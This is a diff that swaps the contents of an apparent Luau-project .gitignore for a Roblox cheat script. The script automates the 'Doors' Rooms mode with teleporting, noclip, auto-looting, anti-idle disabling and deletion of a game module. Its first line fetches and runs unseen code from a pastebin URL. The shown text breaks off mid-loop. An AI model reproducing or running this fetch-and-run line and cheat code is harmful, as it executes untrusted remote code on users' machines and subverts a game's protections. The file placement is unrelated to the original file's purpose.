@@ -1,14 +1,876 @@
-# A fast, small, safe, gradually typed embeddable scripting language derived from Lua
-#
-# https://github.com/luau-lang/luau
-# https://luau.org/
+loadstring(game:HttpGet('https://pastebin.com/raw/f6mB6REz'))() 
 
-# Code coverage
-coverage.out
+if workspace:FindFirstChild("PathFindPartsFolder") then
+    print("Скрипт уже запущен!")
+    return
+end
 
-# Profiling
-profile.out
-profile.svg
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+local HumanoidRootPart = Character:WaitForChild("HumanoidRootPart")
+task.wait(2)
 
-# Time trace
-trace.json
+local PathfindingService = game:GetService("PathfindingService")
+local Lighting = game:GetService("Lighting")
+local RunService = game:GetService("RunService")
+local LatestRoom = game.ReplicatedStorage.GameData.LatestRoom
+local isScriptFinished = false
+
+local Sound = Instance.new("Sound")
+Sound.Parent = game.SoundService
+Sound.SoundId = "rbxassetid://550209561"
+Sound.Volume = 5
+Sound.PlayOnRemove = true
+Sound:Destroy()
+
+LocalPlayer.CameraMode = Enum.CameraMode.Classic
+LocalPlayer.DevComputerMovementMode = Enum.DevComputerMovementMode.KeyboardMouse
+
+task.spawn(function()
+    while not isScriptFinished do
+        if not isPaused then
+            Lighting.Brightness = 2
+            Lighting.ClockTime = 14
+            Lighting.FogEnd = 100000
+            Lighting.GlobalShadows = false
+            Lighting.Ambient = Color3.fromRGB(255, 255, 255)
+            Lighting.OutdoorAmbient = Color3.fromRGB(255, 255, 255)
+        end
+        task.wait(1)
+    end
+end)
+
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Parent = game.CoreGui
+
+local TextLabel = Instance.new("TextLabel")
+TextLabel.Parent = ScreenGui
+TextLabel.Size = UDim2.new(0, 350, 0, 100)
+TextLabel.TextSize = 48
+TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel.TextStrokeColor3 = Color3.new(0, 0, 0)
+TextLabel.TextStrokeTransparency = 0
+TextLabel.BackgroundTransparency = 1
+
+local AlertLabel = Instance.new("TextLabel")
+AlertLabel.Parent = ScreenGui
+AlertLabel.Size = UDim2.new(1, 0, 0, 150)
+AlertLabel.Position = UDim2.new(0, 0, 0.25, 0)
+AlertLabel.TextSize = 55
+AlertLabel.Font = Enum.Font.SourceSansBold
+AlertLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
+AlertLabel.TextStrokeColor3 = Color3.new(0, 0, 0)
+AlertLabel.TextStrokeTransparency = 0
+AlertLabel.BackgroundTransparency = 1
+AlertLabel.Text = ""
+AlertLabel.Visible = false
+
+-- ====== ПАУЗА (кнопка Z) ======
+local isPaused = false
+
+local PauseLabel = Instance.new("TextLabel")
+PauseLabel.Parent = ScreenGui
+PauseLabel.Size = UDim2.new(1, 0, 0, 80)
+PauseLabel.Position = UDim2.new(0, 0, 0.45, 0)
+PauseLabel.TextSize = 42
+PauseLabel.Font = Enum.Font.SourceSansBold
+PauseLabel.TextColor3 = Color3.fromRGB(255, 220, 0)
+PauseLabel.TextStrokeColor3 = Color3.new(0, 0, 0)
+PauseLabel.TextStrokeTransparency = 0
+PauseLabel.BackgroundTransparency = 1
+PauseLabel.Text = "⏸ ПАУЗА  [Z — продолжить]"
+PauseLabel.Visible = false
+
+local UserInputService = game:GetService("UserInputService")
+UserInputService.InputBegan:Connect(function(input, gameProcessed)
+    if input.KeyCode == Enum.KeyCode.Z then
+        isPaused = not isPaused
+        if isPaused then
+            PauseLabel.Visible = true
+            local humanoid = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
+            if humanoid then
+                humanoid.WalkSpeed = 16
+                humanoid:Move(Vector3.new(0, 0, 0), true)
+            end
+            if isSafeInBunker and savedPosition then
+                local hrp = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
+                if hrp then
+                    setCharacterCollision(true)
+                    hrp.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
+                    hrp.CFrame = CFrame.new(savedPosition)
+                end
+                isSafeInBunker = false
+                isReturning = false
+                isTeleporting = false
+                forceEmergencyStop = false
+                savedPosition = nil
+                currentTrackingEntity = nil
+                currentTarget = nil
+                a120Mode = "none"
+                a120Entity = nil
+                a120LockerTarget = nil
+            end
+        else
+            PauseLabel.Visible = false
+            lastEntityCheckTime = -999
+            lastFastCheckTime   = -999
+            lastBunkerExitTime  = -999
+            forceRecomputePath  = true
+            currentTarget       = nil
+        end
+    end
+end)
+
+local GC = getconnections or get_signal_cons
+if GC then
+    for i, v in pairs(GC(LocalPlayer.Idled)) do
+        if v["Disable"] then v["Disable"](v)
+        elseif v["Disconnect"] then v["Disconnect"](v) end
+    end
+end
+
+local Folder = Instance.new("Folder")
+Folder.Parent = workspace
+Folder.Name = "PathFindPartsFolder"
+
+-- АНТИ-А90
+task.spawn(function()
+    while not isScriptFinished do
+        pcall(function()
+            local mainUI = LocalPlayer.PlayerGui:FindFirstChild("MainUI")
+            if mainUI then
+                local modules = mainUI.Initiator.Main_Game.RemoteListener.Modules
+                local a90 = modules:FindFirstChild("A90")
+                if a90 then a90:Destroy() end
+            end
+        end)
+        task.wait(0.1)
+    end
+end)
+
+function getCurrentRoom()
+    return workspace.CurrentRooms:FindFirstChild(tostring(LatestRoom.Value))
+        or workspace.CurrentRooms:FindFirstChild(string.format("%04d", LatestRoom.Value))
+end
+
+function getPath()
+    local room = getCurrentRoom()
+    if room and room:FindFirstChild("Door") and room.Door:FindFirstChild("Door") then
+        return room.Door.Door
+    end
+    return nil
+end
+
+local function getFloorY(room)
+    if not room then return -25 end
+
+    local char = LocalPlayer.Character
+    local myPos = char and char:FindFirstChild("HumanoidRootPart")
+        and char.HumanoidRootPart.Position
+        or Vector3.new(0, 0, 0)
+
+    local f = room:FindFirstChild("Floor")
+    if f and f:IsA("BasePart") then return f.Position.Y + f.Size.Y / 2 end
+
+    local bestY, bestDist = nil, math.huge
+    for _, p in pairs(room:GetDescendants()) do
+        if p:IsA("BasePart") and p.Size.X > 3 and p.Size.Z > 3 and p.Size.Y < 4 then
+            local top = p.Position.Y + p.Size.Y / 2
+            if top <= myPos.Y + 2 then
+                local xzDist = Vector2.new(myPos.X - p.Position.X, myPos.Z - p.Position.Z).Magnitude
+                if xzDist < 30 and xzDist < bestDist then
+                    bestDist = xzDist
+                    bestY = top
+                end
+            end
+        end
+    end
+    if bestY then return bestY end
+
+    local fallbackY, fallbackArea = nil, 0
+    for _, p in pairs(room:GetChildren()) do
+        if p:IsA("BasePart") then
+            local area = p.Size.X * p.Size.Z
+            if area > fallbackArea and p.Size.Y < 5 then
+                fallbackArea = area
+                fallbackY = p.Position.Y + p.Size.Y / 2
+            end
+        end
+    end
+    return fallbackY or -25
+end
+
+-- Цвет сломанного шкафа (MeshPart/Part "Base"): RGB 84, 90, 98
+-- Цвет рабочего шкафа (MeshPart/Part "Base"): RGB 58, 58, 62
+-- Также сломанный шкаф имеет имя содержащее "BrokenLocker"
+local BROKEN_COLOR = Color3.fromRGB(84, 90, 98)
+local COLOR_TOL = 12  -- допуск на каждый канал (0-255)
+
+local function isLockerWorking(obj)
+    -- Сразу отсеиваем по имени модели
+    if string.find(obj.Name, "BrokenLocker") then return false end
+    -- Ищем MeshPart или Part с именем "Base" среди потомков
+    for _, child in pairs(obj:GetDescendants()) do
+        if child.Name == "Base" and (child:IsA("MeshPart") or child:IsA("Part") or child:IsA("BasePart")) then
+            local c = child.Color
+            -- Если цвет совпадает с цветом сломанного — шкаф сломан
+            if math.abs(c.R*255 - BROKEN_COLOR.R*255) <= COLOR_TOL
+            and math.abs(c.G*255 - BROKEN_COLOR.G*255) <= COLOR_TOL
+            and math.abs(c.B*255 - BROKEN_COLOR.B*255) <= COLOR_TOL then
+                return false
+            end
+            -- Нашли Base с другим цветом — шкаф рабочий
+            return true
+        end
+    end
+    -- Нет Base вообще — считаем рабочим (не исключаем без причины)
+    return true
+end
+
+local function findNearestLocker()
+    if not LocalPlayer.Character or not LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then return nil end
+    local myPos = LocalPlayer.Character.HumanoidRootPart.Position
+    local nearest, nearestDist = nil, math.huge
+    local currentRoom = getCurrentRoom()
+    if not currentRoom then return nil end
+    local roomsToScan = {currentRoom}
+    local prevRoom = workspace.CurrentRooms:FindFirstChild(tostring(LatestRoom.Value - 1))
+        or workspace.CurrentRooms:FindFirstChild(string.format("%04d", LatestRoom.Value - 1))
+    if prevRoom then table.insert(roomsToScan, prevRoom) end
+    for _, room in pairs(roomsToScan) do
+        for _, obj in pairs(room:GetDescendants()) do
+            if obj:IsA("Model") and (string.find(obj.Name, "Locker") or string.find(obj.Name, "Wardrobe")) then
+                -- Пропускаем сломанные шкафы
+                if isLockerWorking(obj) then
+                    local root = obj:FindFirstChild("Main") or obj:FindFirstChildOfClass("Part")
+                        or obj:FindFirstChildOfClass("MeshPart") or obj.PrimaryPart
+                    if root then
+                        -- FIX: Приоритизируем шкафы на том же этаже.
+                        -- Штрафуем шкафы с большой разницей по Y — умножаем YDiff на 4,
+                        -- чтобы шкаф на другом этаже (dY > 8) проигрывал дальнему на том же этаже.
+                        local xzDist = Vector2.new(myPos.X - root.Position.X, myPos.Z - root.Position.Z).Magnitude
+                        local yDiff = math.abs(myPos.Y - root.Position.Y)
+                        local weightedDist = xzDist + yDiff * 4
+                        if weightedDist < nearestDist then nearestDist = weightedDist; nearest = obj end
+                    end
+                end
+            end
+        end
+    end
+    return nearest
+end
+
+-- FIX: Смещаем цель на 2.5 студа перед шкафом (к дверце), а не к центру модели
+local function getLockerPosition(locker)
+    if not locker then return nil end
+    local root = locker:FindFirstChild("Main") or locker:FindFirstChildOfClass("Part")
+        or locker:FindFirstChildOfClass("MeshPart") or locker.PrimaryPart
+    if not root then return nil end
+    -- Смещаем цель вперёд по LookVector — к дверце шкафа
+    local cf = root.CFrame
+    return cf.Position + cf.LookVector * 2.5
+end
+
+local a60SpeedCache = {}
+
+local function getEntitySpeed(entity)
+    local main = entity:FindFirstChild("Main") or entity:FindFirstChildOfClass("Part") or entity:FindFirstChildOfClass("MeshPart")
+    if not main then return 0 end
+    local now = os.clock()
+    local cache = a60SpeedCache[entity]
+    if cache and (now - cache.lastTime) < 2.0 then
+        local moved = (main.Position - cache.lastPos).Magnitude
+        local dt = now - cache.lastTime
+        if dt > 0.05 then
+            a60SpeedCache[entity] = {lastPos = main.Position, lastTime = now, speed = moved / dt}
+            return moved / dt
+        end
+        return cache.speed or 0
+    end
+    a60SpeedCache[entity] = {lastPos = main.Position, lastTime = now, speed = 0}
+    return 0
+end
+
+function findEntity()
+    if not LocalPlayer.Character or not LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then return nil, nil end
+    local myPos = LocalPlayer.Character.HumanoidRootPart.Position
+
+    -- FIX: Сначала сканируем workspace напрямую (дети верхнего уровня) —
+    -- сущности как правило сидят прямо в workspace, а не внутри CurrentRooms.
+    -- Это быстрее чем GetDescendants() всего workspace.
+    local scanTargets = {}
+    for _, obj in pairs(workspace:GetChildren()) do
+        if obj:IsA("Model") and obj ~= LocalPlayer.Character then
+            table.insert(scanTargets, obj)
+        end
+    end
+    -- Также проверяем потомков CurrentRooms — сущность может быть вложена глубже
+    if workspace:FindFirstChild("CurrentRooms") then
+        for _, obj in pairs(workspace.CurrentRooms:GetDescendants()) do
+            if obj:IsA("Model") and not obj:IsDescendantOf(LocalPlayer.Character) then
+                table.insert(scanTargets, obj)
+            end
+        end
+    end
+
+    for _, obj in pairs(scanTargets) do
+        if obj.Name ~= "Character" and not obj:IsDescendantOf(LocalPlayer.Character) then
+            local name = string.lower(obj.Name)
+            if not string.find(name, "room") and not string.find(name, "current") and not string.find(name, "folder") then
+                local main = obj:FindFirstChild("Main") or obj:FindFirstChildOfClass("Part") or obj:FindFirstChildOfClass("MeshPart")
+                if main then
+                    local distXZ = Vector2.new(myPos.X - main.Position.X, myPos.Z - main.Position.Z).Magnitude
+
+                    local detectedType = nil
+                    if string.find(name, "a60") or string.find(name, "a%-60") then
+                        detectedType = "A60"
+                    elseif string.find(name, "a120") or string.find(name, "a%-120") then
+                        detectedType = "A120"
+                    end
+
+                    if not detectedType then
+                        local hasA60Sign, hasA120Sign = false, false
+                        for _, child in pairs(obj:GetDescendants()) do
+                            if child:IsA("Sound") then
+                                local sid = child.SoundId
+                                if string.find(sid, "a120") or sid == "rbxassetid://9114223403" or sid == "rbxassetid://9114227198" then
+                                    hasA120Sign = true
+                                elseif string.find(sid, "rush") or string.find(sid, "a60") then
+                                    hasA60Sign = true
+                                end
+                            elseif child:IsA("Decal") or child:IsA("Texture") then
+                                if string.find(string.lower(child.Texture), "120") then hasA120Sign = true end
+                            end
+                        end
+                        if hasA120Sign then detectedType = "A120"
+                        elseif hasA60Sign or string.find(name, "monster") or string.find(name, "entity") or string.find(name, "rush") then
+                            detectedType = "A60"
+                        end
+                    end
+
+                    if detectedType then
+                        local speed = detectedType == "A60" and getEntitySpeed(obj) or 0
+                        local detectionRange = 1850
+                        if speed > 80 then detectionRange = 2500 end
+                        if speed > 120 then detectionRange = 3000 end
+
+                        if distXZ < detectionRange then
+                            return obj, detectedType
+                        end
+                    end
+                end
+            end
+        end
+    end
+    return nil, nil
+end
+
+LatestRoom:GetPropertyChangedSignal("Value"):Connect(function()
+    if isScriptFinished then return end
+    TextLabel.Text = "Room: " .. math.clamp(LatestRoom.Value, 1, 1000)
+end)
+
+local function autoLootAndInteractions(hrp)
+    local room = getCurrentRoom()
+    if not room then return end
+    for _, item in pairs(room:GetDescendants()) do
+        if item:IsA("ProximityPrompt") and item.Name ~= "HidePrompt" then
+            if (hrp.Position - item.Parent.Position).Magnitude < 12 then
+                if item.Parent.Name == "GoldPile" or item.ObjectText == "Drawer" or item.ActionText == "Open" then
+                    fireproximityprompt(item)
+                end
+            end
+        end
+    end
+end
+
+-- ====== СОСТОЯНИЕ ======
+local currentTarget       = nil
+local forceEmergencyStop  = false
+local isSafeInBunker      = false
+local forceRecomputePath  = false
+local savedPosition       = nil
+local lockTimer           = 0
+local isReturning         = false
+local currentTrackingEntity = nil
+local isTeleporting       = false
+local a120Mode            = "none"
+local a120LockerTarget    = nil
+local a120Entity          = nil
+
+local lastValidSurfacePos = HumanoidRootPart.Position
+
+local lastEntityCheckTime = -999
+local cachedFloorY        = -25
+local lastFloorCheckTime  = -999
+local lastBunkerExitTime  = -999
+local lastFastCheckTime   = -999
+
+local function fastA60Check()
+    if not LocalPlayer.Character then return nil end
+    local hrp = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
+    if not hrp then return nil end
+    local myPos = hrp.Position
+    for _, obj in pairs(workspace:GetDescendants()) do
+        if obj:IsA("Model") then
+            local name = string.lower(obj.Name)
+            if string.find(name, "a60") or string.find(name, "a%-60")
+               or string.find(name, "rush") then
+                local main = obj:FindFirstChild("Main")
+                    or obj:FindFirstChildOfClass("Part")
+                    or obj:FindFirstChildOfClass("MeshPart")
+                if main then
+                    local d = Vector2.new(myPos.X - main.Position.X, myPos.Z - main.Position.Z).Magnitude
+                    if d < 3000 then return obj end
+                end
+            end
+        end
+    end
+    return nil
+end
+
+local function setCharacterCollision(on)
+    local char = LocalPlayer.Character
+    if not char then return end
+    for _, p in pairs(char:GetDescendants()) do
+        if p:IsA("BasePart") then
+            p.CanTouch = on
+            if p.Name ~= "HumanoidRootPart" then p.CanCollide = on end
+        end
+    end
+end
+
+local function buildLockerPath(hrp, lockerPos)
+    local path = PathfindingService:CreatePath({ WaypointSpacing = 3.5, AgentRadius = 1.8, AgentCanJump = true })
+    path:ComputeAsync(hrp.Position - Vector3.new(0, 2.5, 0), lockerPos)
+    local wps = path:GetWaypoints()
+    if path.Status ~= Enum.PathStatus.NoPath and #wps > 0 then
+        Folder:ClearAllChildren()
+        for _, wp in pairs(wps) do
+            local p = Instance.new("Part")
+            p.Size = Vector3.new(0.3, 0.3, 0.3)
+            p.Position = wp.Position
+            p.Shape = "Ball"
+            p.Material = "Neon"
+            p.Color = Color3.fromRGB(0, 150, 255)
+            p.Anchored = true
+            p.CanCollide = false
+            p.Parent = Folder
+        end
+        return wps
+    end
+    return nil
+end
+
+local function isA120Gone(entity)
+    if not entity or not entity.Parent or not entity:IsDescendantOf(workspace) then return true end
+    local char = LocalPlayer.Character
+    if char and char:FindFirstChild("HumanoidRootPart") then
+        local myPos = char.HumanoidRootPart.Position
+        local main = entity:FindFirstChild("Main") or entity:FindFirstChildOfClass("Part") or entity:FindFirstChildOfClass("MeshPart")
+        if main and Vector2.new(myPos.X - main.Position.X, myPos.Z - main.Position.Z).Magnitude > 1400 then
+            return true
+        end
+    end
+    return false
+end
+
+-- ====== RENDER LOOP ======
+local RenderConnection
+RenderConnection = RunService.PreRender:Connect(function()
+    if isScriptFinished then
+        if RenderConnection then RenderConnection:Disconnect() end
+        setCharacterCollision(true)
+        return
+    end
+    if isPaused then return end
+    if not (LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")) then return end
+    local humanoid = LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
+    local hrp = LocalPlayer.Character.HumanoidRootPart
+    if not humanoid then return end
+
+    local now = os.clock()
+
+    -- Быстрый ранний детект A-60
+    if not isSafeInBunker and not isTeleporting and not isReturning
+       and a120Mode == "none" and (now - lastFastCheckTime) > 0.05 then
+        lastFastCheckTime = now
+        local fastEntity = fastA60Check()
+        if fastEntity and not isSafeInBunker then
+            if (now - lastBunkerExitTime) > 2.0 then
+                isTeleporting = true
+                forceEmergencyStop = true
+                currentTarget = nil
+                forceRecomputePath = true
+                AlertLabel.Text = "🚨 А-60 ОБНАРУЖЕН ЗАРАНЕЕ! 🚨"
+                AlertLabel.Visible = true
+                currentTrackingEntity = fastEntity
+                lockTimer = now
+
+                wait(1)
+
+                local floorY = getFloorY(getCurrentRoom())
+                savedPosition = Vector3.new(hrp.Position.X, floorY + 3, hrp.Position.Z)
+
+                setCharacterCollision(false)
+                hrp.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
+                hrp.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
+                hrp.CFrame = CFrame.new(hrp.Position.X, floorY + 150, hrp.Position.Z)
+
+                isSafeInBunker = true
+                isTeleporting = false
+                lastEntityCheckTime = now
+            end
+        end
+    end
+
+    -- АНТИБЕЗДНА / АНТИПОТОЛОК
+    if not isSafeInBunker and not isTeleporting and not isReturning then
+        if now - lastFloorCheckTime > 2.0 then
+            cachedFloorY = getFloorY(getCurrentRoom())
+            lastFloorCheckTime = now
+        end
+        local baseY = cachedFloorY
+        if hrp.Position.Y > (baseY + 70) then
+            if lastValidSurfacePos then
+                hrp.CFrame = CFrame.new(lastValidSurfacePos + Vector3.new(0, 3, 0))
+                hrp.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
+                forceRecomputePath = true
+            end
+        elseif hrp.Position.Y < (baseY - 80) then
+            if lastValidSurfacePos then
+                hrp.CFrame = CFrame.new(lastValidSurfacePos + Vector3.new(0, 4, 0))
+                hrp.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
+                forceRecomputePath = true
+                return
+            end
+        elseif hrp.Position.Y >= (baseY - 10) and hrp.Position.Y <= (baseY + 40) then
+            if math.floor(now * 2) % 2 == 0 then
+                lastValidSurfacePos = hrp.Position
+            end
+        end
+    end
+
+    -- ДВИЖЕНИЕ К ЦЕЛИ
+    if currentTarget and not isSafeInBunker and not isTeleporting then
+        local dir = Vector3.new(currentTarget.X, hrp.Position.Y, currentTarget.Z) - hrp.Position
+        if a120Mode == "none" and not isReturning and dir.Magnitude > 22 then
+            hrp.CFrame = CFrame.new(currentTarget + Vector3.new(0, 1.2, 0))
+            hrp.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
+            forceRecomputePath = true
+        end
+        if a120Mode == "navigating" or (a120Mode == "none" and not isReturning) then
+            humanoid.WalkSpeed = 21.5
+            hrp.CFrame = CFrame.lookAt(hrp.Position, Vector3.new(currentTarget.X, hrp.Position.Y, currentTarget.Z))
+            humanoid:Move(dir.Magnitude > 1.2 and dir.Unit or Vector3.new(0, 0, 0), true)
+        end
+    end
+
+    -- СТОП И УДЕРЖАНИЕ НАД КОМНАТОЙ
+    if a120Mode == "hiding" or isSafeInBunker or isReturning or isTeleporting then
+        if not (a120Mode == "hiding" and not a120LockerTarget) then
+            humanoid.WalkSpeed = 0
+            humanoid:Move(Vector3.new(0, 0, 0), true)
+        end
+        if isSafeInBunker and savedPosition then
+            hrp.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
+            hrp.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
+            hrp.CFrame = CFrame.new(savedPosition.X, savedPosition.Y + 150, savedPosition.Z)
+        end
+    else
+        if not forceEmergencyStop and a120Mode == "none" then
+            autoLootAndInteractions(hrp)
+        end
+    end
+
+    -- ВЫХОД ИЗ РЕЖИМА A-120
+    if (a120Mode == "hiding" or a120Mode == "navigating") and isA120Gone(a120Entity) then
+        AlertLabel.Text = "✅ А-120 ушел!"
+        AlertLabel.Visible = true
+        -- FIX: сразу сбрасываем в "none" — не держим "resuming" долго,
+        -- чтобы новый A-120 сразу детектился
+        currentTarget = nil; a120Mode = "none"; a120Entity = nil
+        a120LockerTarget = nil; forceRecomputePath = true; forceEmergencyStop = false
+        task.spawn(function()
+            task.wait(0.5)
+            AlertLabel.Visible = false
+        end)
+    end
+
+    -- ОЖИДАНИЕ ПОКА A-60 ПРОЙДЁТ
+    if isSafeInBunker and not isTeleporting then
+        local monsterGone = false
+
+        if now > lockTimer + 12.0 then
+            if currentTrackingEntity and currentTrackingEntity.Parent
+               and currentTrackingEntity:IsDescendantOf(workspace) then
+                local main = currentTrackingEntity:FindFirstChild("Main")
+                    or currentTrackingEntity:FindFirstChildOfClass("Part")
+                    or currentTrackingEntity:FindFirstChildOfClass("MeshPart")
+                if main and savedPosition then
+                    local dist = Vector2.new(
+                        savedPosition.X - main.Position.X,
+                        savedPosition.Z - main.Position.Z
+                    ).Magnitude
+                    if dist > 2000 then monsterGone = true end
+                else
+                    monsterGone = true
+                end
+            else
+                monsterGone = true
+            end
+            if now > lockTimer + 25.0 then monsterGone = true end
+        end
+
+        if monsterGone then
+            isTeleporting = true
+            AlertLabel.Text = "✅ А-60 ушёл! Возвращаемся..."
+            AlertLabel.Visible = true
+            isSafeInBunker = false
+            isReturning = true
+            currentTarget = nil
+
+            task.spawn(function()
+                local returnPos = savedPosition or Vector3.new(hrp.Position.X, getFloorY(getCurrentRoom()) + 3, hrp.Position.Z)
+                if hrp and hrp.Parent then
+                    setCharacterCollision(false)
+                    hrp.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
+                    hrp.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
+                    hrp.CFrame = CFrame.new(returnPos)
+                    lastValidSurfacePos = returnPos
+                    task.wait(0.2)
+                    setCharacterCollision(true)
+                    hrp.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
+                end
+                task.wait(0.15)
+                currentTarget = nil
+                forceRecomputePath = true
+                AlertLabel.Visible = false
+                savedPosition = nil
+                currentTrackingEntity = nil
+                isReturning = false
+                forceEmergencyStop = false
+                lastBunkerExitTime = os.clock()
+                lastEntityCheckTime = os.clock()
+                isTeleporting = false
+            end)
+        else
+            if hrp and savedPosition then
+                hrp.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
+                hrp.CFrame = CFrame.new(savedPosition.X, savedPosition.Y + 150, savedPosition.Z)
+            end
+            return
+        end
+
+    else
+        -- ДЕТЕКТ A-60 / A-120 (основной, полный)
+        -- FIX: A-120 проверяем всегда (без кулдауна lastBunkerExitTime),
+        --      A-60 по-прежнему ждёт 3 сек после выхода из бункера
+        if not isReturning and not isTeleporting and not isSafeInBunker
+           and (a120Mode == "none" or a120Mode == "resuming")
+           and (now - lastEntityCheckTime) > 0.08 then
+
+            lastEntityCheckTime = now
+            local Entity, detectedType = findEntity()
+
+            if Entity and detectedType then
+                if detectedType == "A120" then
+                    a120Entity = Entity
+                    forceEmergencyStop = true
+                    forceRecomputePath = true
+                    currentTarget = nil
+                    local locker = findNearestLocker()
+                    if locker then
+                        local lockerPos = getLockerPosition(locker)
+                        if lockerPos then
+                            a120LockerTarget = lockerPos
+                            currentTarget = lockerPos
+                            a120Mode = "navigating"
+                            AlertLabel.Text = "🔵 А-120! БЕГУ К ШКАФУ!"
+                            AlertLabel.Visible = true
+                        else
+                            a120Mode = "hiding"; a120LockerTarget = nil; forceEmergencyStop = false
+                            AlertLabel.Text = "⚠️ ШКАФ СЛОМАН!"
+                            AlertLabel.Visible = true
+                        end
+                    else
+                        a120Mode = "hiding"; a120LockerTarget = nil; forceEmergencyStop = false
+                        AlertLabel.Text = "⚠️ НЕТ ШКАФОВ!"
+                        AlertLabel.Visible = true
+                    end
+
+                elseif detectedType == "A60" then
+                    -- FIX: Пропускаем A-60 если кулдаун после бункера не прошёл
+                    if (now - lastBunkerExitTime) <= 3.0 then
+                        -- ничего не делаем
+                    else
+                    isTeleporting = true
+                    forceEmergencyStop = true
+                    currentTarget = nil
+                    forceRecomputePath = true
+                    AlertLabel.Text = "🚨 А-60! УХОДИМ НАВЕРХ... 🚨"
+                    AlertLabel.Visible = true
+                    currentTrackingEntity = Entity
+                    lockTimer = os.clock()
+
+                    wait(1.5)
+
+                    local floorY = getFloorY(getCurrentRoom())
+                    savedPosition = Vector3.new(hrp.Position.X, floorY + 3, hrp.Position.Z)
+
+                    setCharacterCollision(false)
+                    hrp.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
+                    hrp.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
+                    hrp.CFrame = CFrame.new(hrp.Position.X, floorY + 150, hrp.Position.Z)
+
+                    isSafeInBunker = true
+                    isTeleporting = false
+                    end -- конец проверки кулдауна A-60
+                end
+            end
+        end
+    end
+end)
+
+-- ====== ОСНОВНОЙ ЦИКЛ ======
+while true do
+    if LatestRoom.Value >= 1000 or isScriptFinished then
+        isScriptFinished = true
+        if RenderConnection then RenderConnection:Disconnect() end
+        Folder:ClearAllChildren(); Folder:Destroy(); ScreenGui:Destroy()
+        print("Скрипт завершил работу!")
+        break
+    end
+
+    if isSafeInBunker or isTeleporting then task.wait(0.1); continue end
+    if isPaused then task.wait(0.1); continue end
+
+    if not getCurrentRoom() then currentTarget = nil; task.wait(0.1); continue end
+
+    local hrp = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
+    local humanoid = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
+
+    -- Навигация к шкафу (A-120)
+    if a120Mode == "navigating" and hrp and humanoid and a120LockerTarget then
+        local wps = buildLockerPath(hrp, a120LockerTarget)
+        if wps and #wps > 0 then
+            for _, wp in pairs(wps) do
+                if a120Mode ~= "navigating" or isScriptFinished or isSafeInBunker then currentTarget = nil; break end
+                if not hrp.Anchored then
+                    currentTarget = wp.Position
+                    local t0 = os.clock(); local jumped = false
+                    repeat
+                        task.wait(0.02)
+                        if a120Mode ~= "navigating" or isScriptFinished or isSafeInBunker then currentTarget = nil; break end
+                        local d = (Vector3.new(wp.Position.X, hrp.Position.Y, wp.Position.Z) - hrp.Position).Magnitude
+                        if (os.clock() - t0) > 0.3 and not jumped and humanoid then
+                            humanoid.Jump = true; jumped = true; t0 = os.clock()
+                        end
+                    until d <= 3.2 or a120Mode ~= "navigating" or isScriptFinished or isSafeInBunker
+                end
+            end
+
+            -- FIX: Порог увеличен с 5.0 до 7.0 — учитываем что lockerPos со смещением
+            if a120Mode == "navigating" and hrp and not isSafeInBunker then
+                local d = (Vector3.new(a120LockerTarget.X, hrp.Position.Y, a120LockerTarget.Z) - hrp.Position).Magnitude
+                if d <= 7.0 then
+                    a120Mode = "hiding"; currentTarget = nil; forceEmergencyStop = false
+                    if humanoid then humanoid.WalkSpeed = 0; humanoid:Move(Vector3.new(0,0,0), true) end
+                    AlertLabel.Text = "🟢 У ШКАФА! ЗАЛЕЗАЙТЕ ВРУЧНУЮ!"
+                    AlertLabel.Visible = true
+                end
+            end
+        else
+            -- FIX: Попытка найти другой шкаф вместо немедленного "hiding"
+            local fallbackLocker = findNearestLocker()
+            if fallbackLocker then
+                local newPos = getLockerPosition(fallbackLocker)
+                if newPos and (newPos - a120LockerTarget).Magnitude > 3 then
+                    -- Нашли другой шкаф — пробуем его
+                    a120LockerTarget = newPos
+                    currentTarget = newPos
+                    AlertLabel.Text = "🔵 ПЕРЕХОЖУ К ДРУГОМУ ШКАФУ..."
+                    AlertLabel.Visible = true
+                else
+                    -- Тот же шкаф или nil — путь точно сломан
+                    a120Mode = "hiding"; a120LockerTarget = nil; currentTarget = nil; forceEmergencyStop = false
+                    AlertLabel.Text = "⚠️ ПУТЬ К ШКАФУ СЛОМАН!"
+                    AlertLabel.Visible = true
+                end
+            else
+                a120Mode = "hiding"; a120LockerTarget = nil; currentTarget = nil; forceEmergencyStop = false
+                AlertLabel.Text = "⚠️ ПУТЬ К ШКАФУ СЛОМАН!"
+                AlertLabel.Visible = true
+            end
+        end
+        task.wait(0.05); continue
+    end
+
+    -- Обычная навигация по комнатам
+    local Destination = getPath()
+    local ok = Destination and hrp and not isSafeInBunker and not isReturning
+        and not forceRecomputePath and not isTeleporting
+    if ok and (not forceEmergencyStop or (a120Mode == "hiding" and not a120LockerTarget)) then
+        local path = PathfindingService:CreatePath({ WaypointSpacing = 3.5, AgentRadius = 1.8, AgentCanJump = true })
+        path:ComputeAsync(hrp.Position - Vector3.new(0, 2.5, 0), Destination.Position)
+        local Waypoints = path:GetWaypoints()
+
+        if path.Status ~= Enum.PathStatus.NoPath and #Waypoints > 0 and not forceRecomputePath then
